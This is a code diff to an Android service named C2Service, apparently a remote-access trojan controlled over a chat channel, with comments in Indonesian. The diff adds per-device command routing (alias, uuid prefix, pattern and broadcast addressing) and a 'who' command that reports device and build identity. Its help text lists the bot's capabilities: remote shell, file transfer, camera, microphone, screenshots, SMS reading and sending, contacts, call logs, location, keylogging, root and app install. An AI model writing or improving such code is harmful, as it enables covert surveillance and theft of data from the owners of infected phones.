@@ -20,13 +20,16 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
+import android.os.Process
 import android.os.StatFs
+import android.os.SystemClock
 import android.telephony.SmsManager
 import android.widget.Toast
 import androidx.core.app.ServiceCompat
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
+import java.security.MessageDigest
 import kotlin.random.Random
 
 /**
@@ -48,8 +51,22 @@ class C2Service : Service() {
     private var pollMs = Config.POLL_MS
     private var announced = false
 
+    /**
+     * Nama pendek perangkat untuk routing dan prefix balasan.
+     *
+     * Alias dari Config dipakai kalau diisi eksplisit. Kalau kosong, diambil
+     * dari codename perangkat (Build.DEVICE), mis. ginkgo -> gink. Ini yang
+     * bikin dua HP di channel yang sama tidak lagi sama-sama menjawab `!b`.
+     */
+    private val deviceTag: String by lazy {
+        val set = Config.alias.trim().lowercase()
+        if (set.isNotEmpty()) set
+        else (Build.DEVICE ?: "").filter { it.isLetterOrDigit() }.lowercase()
+            .take(4).ifEmpty { "dev" }
+    }
+
     private val tag: String
-        get() = "[" + Config.alias + "] "
+        get() = "[$deviceTag] "
 
     override fun onCreate() {
         super.onCreate()
@@ -170,8 +187,8 @@ class C2Service : Service() {
                     .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                 say(
                     "online | ${Build.MANUFACTURER} ${Build.MODEL} | android ${Build.VERSION.RELEASE} " +
-                        "(sdk ${Build.VERSION.SDK_INT}) | batt $pct% | " +
-                        "perm ${Perms.missing(this).size} kurang"
+                        "(sdk ${Build.VERSION.SDK_INT}) | batt $pct% | id ${Config.uuid.take(8)} | " +
+                        "!$deviceTag | perm ${Perms.missing(this).size} kurang"
                 )
             }
             val batch = try {
@@ -205,18 +222,37 @@ class C2Service : Service() {
     // ---------------------------------------------------------------- parsing
 
     /**
-     * Hanya menerima perintah ber-prefix: `!b <cmd>`, `b <cmd>`, `!<uuid> <cmd>`,
-     * atau `!* <cmd>`. Tanpa prefix, pesan diabaikan diam-diam — versi lama
-     * menjawab UNKNOWN ke setiap obrolan di channel.
+     * Hanya menerima perintah ber-prefix:
+     *
+     *   `!<alias> <cmd>`     alias perangkat ini (lihat `who`)
+     *   `!<uuid8> <cmd>`     uuid perangkat, 8 huruf pertama
+     *   `!@<pola> <cmd>`     device / uuid8 / model mengandung pola
+     *   `!* <cmd>`           semua perangkat
+     *
+     * Tanpa prefix, pesan diabaikan diam-diam — versi lama menjawab UNKNOWN
+     * ke setiap obrolan di channel. `!@` ditambahkan karena alias bisa kembar:
+     * dua APK yang dibakar dengan --alias b sama-sama menjawab `!b`.
      */
     private fun split(content: String): Pair<String, String>? {
         var t = content.trim()
         if (t.isEmpty()) return null
         val head = t.substringBefore(' ').lowercase()
-        val alias = Config.alias.lowercase()
         val uuid = Config.uuid.lowercase()
-        val isAlias = head == "!$alias" || head == alias || head == "!*" ||
-            (uuid.isNotEmpty() && head.trimStart('!') == uuid)
+        val uuid8 = uuid.take(8)
+        val model = (Build.MODEL ?: "").lowercase()
+
+        val isAlias = when {
+            head == "!*" -> true
+            head.startsWith("!@") -> {
+                val p = head.substring(2)
+                p.isEmpty() || deviceTag.contains(p) || uuid8.contains(p) ||
+                    model.contains(p)
+            }
+            else -> {
+                val h = head.trimStart('!')
+                h == deviceTag || (uuid.isNotEmpty() && (h == uuid || h == uuid8))
+            }
+        }
 
         if (!isAlias) return null
         t = t.substringAfter(' ', "").trim()
@@ -229,6 +265,7 @@ class C2Service : Service() {
     private fun handle(m: JSONObject) {
         val (verb, arg) = split(m.optString("content", "")) ?: return
         when (verb) {
+            "who", "id", "device", "me" -> who()
             "info" -> info()
             "sys" -> say(Actions.sysinfo(this))
             "ping" -> ping()
@@ -307,8 +344,70 @@ class C2Service : Service() {
         )
     }
 
+    /** Detik -> "3h 12m". Dipakai `who`. */
+    private fun uptimeText(seconds: Long): String {
+        val d = seconds / 86400
+        val h = (seconds % 86400) / 3600
+        val m = (seconds % 3600) / 60
+        return when {
+            d > 0 -> "${d}d ${h}h"
+            h > 0 -> "${h}h ${m}m"
+            else -> "${m}m ${seconds % 60}s"
+        }
+    }
+
+    /** sha256 APK, 8 huruf. Ini yang membedakan build baru dari build usang. */
+    private fun apkSha(path: String): String {
+        if (path.isEmpty()) return "?"
+        return try {
+            val md = MessageDigest.getInstance("SHA-256")
+            File(path).inputStream().use { ins ->
+                val buf = ByteArray(64 * 1024)
+                while (true) {
+                    val n = ins.read(buf)
+                    if (n <= 0) break
+                    md.update(buf, 0, n)
+                }
+            }
+            md.digest().take(4).joinToString("") { "%02x".format(it) }
+        } catch (e: Exception) {
+            "?"
+        }
+    }
+
+    /**
+     * Kartu identitas perangkat. Kalau ada lebih dari satu HP di channel yang
+     * sama, `!* who` memunculkan semuanya sekaligus: uuid8 dan sha APK di tiap
+     * baris menunjukkan mana yang membalas dan build-nya yang mana.
+     */
+    private fun who() {
+        val pkg = try {
+            packageManager.getPackageInfo(packageName, 0)
+        } catch (e: Exception) {
+            null
+        }
+        val apk = pkg?.applicationInfo?.sourceDir ?: ""
+        val size = if (apk.isNotEmpty()) "${File(apk).length()} B" else "?"
+        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        say(
+            "who    : ${Config.uuid.take(8)}   (uuid ${Config.uuid})\n" +
+                "device : ${Build.MANUFACTURER} ${Build.MODEL}  (${Build.DEVICE})\n" +
+                "os     : android ${Build.VERSION.RELEASE} sdk ${Build.VERSION.SDK_INT} " +
+                "${Build.SUPPORTED_ABIS.firstOrNull() ?: "?"}\n" +
+                "build  : ${pkg?.versionName ?: "?"}   $size   sha ${apkSha(apk)}\n" +
+                "pkg    : $packageName\n" +
+                "proc   : pid ${Process.myPid()}   up " +
+                uptimeText(SystemClock.elapsedRealtime() / 1000) + "\n" +
+                "batt   : $pct%   perm kurang ${Perms.missing(this).size}\n" +
+                "alamat : !$deviceTag   !${Config.uuid.take(8)}   !@$deviceTag"
+        )
+    }
+
     private fun help() = say(
-        "info sys ping sh cd ls dl up shot cam mic clip ps kill msg toast notify " +
+        "cara alamatkan: ![alias] <verb>  ![uuid8] <verb>  !@[pola] <verb>  !* <verb>\n" +
+            "alias perangkat ini: !$deviceTag   uuid ${Config.uuid.take(8)}\n\n" +
+            "who info sys ping sh cd ls dl up shot cam mic clip ps kill msg toast notify " +
             "tts vib vol torch loc sms smsread contacts calls apps ip storage battery " +
             "wifi root reboot perm boot keylog rick black block open inst grab " +
             "rm mv gh sleep close exit purge"
